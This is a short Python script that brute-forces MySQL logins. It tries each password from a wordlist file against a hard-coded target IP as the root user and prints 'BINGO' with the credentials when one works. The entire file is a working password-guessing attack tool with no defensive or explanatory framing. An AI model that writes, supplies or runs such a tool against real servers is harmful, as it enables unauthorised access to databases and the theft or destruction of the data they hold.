#!/usr/bin/python
import MySQLdb

target = '11.11.11.171'
user = 'root'
pwd = 'yodaninja'
verbose = True

print('=' * 60)
print('MySQL BRUTEFORCE ATTACK')
print('=' * 60)
print()

def bruteforceattack(_target,_user,_pwd):
    try:
        myconn = MySQLdb.connect(host=_target, user=_user,password=_pwd)
        myconn.close()
        print('[+] BINGO - username:', _user, 'password:', _pwd)
        return True 
    except:
        if verbose:
            print('[+] FAIL - username:', _user, 'password:', _pwd)
            


def user_wordlist(_target,_user,_wordlist):
    with open(_wordlist, 'r') as _word:
        for _line in _word:
            _pwd = _line.strip('\n')

            bingo=bruteforceattack(_target,_user,_pwd)
            
            if bingo:
                break

user_wordlist(target, user, 'word.txt')
print()
print('=' * 60)

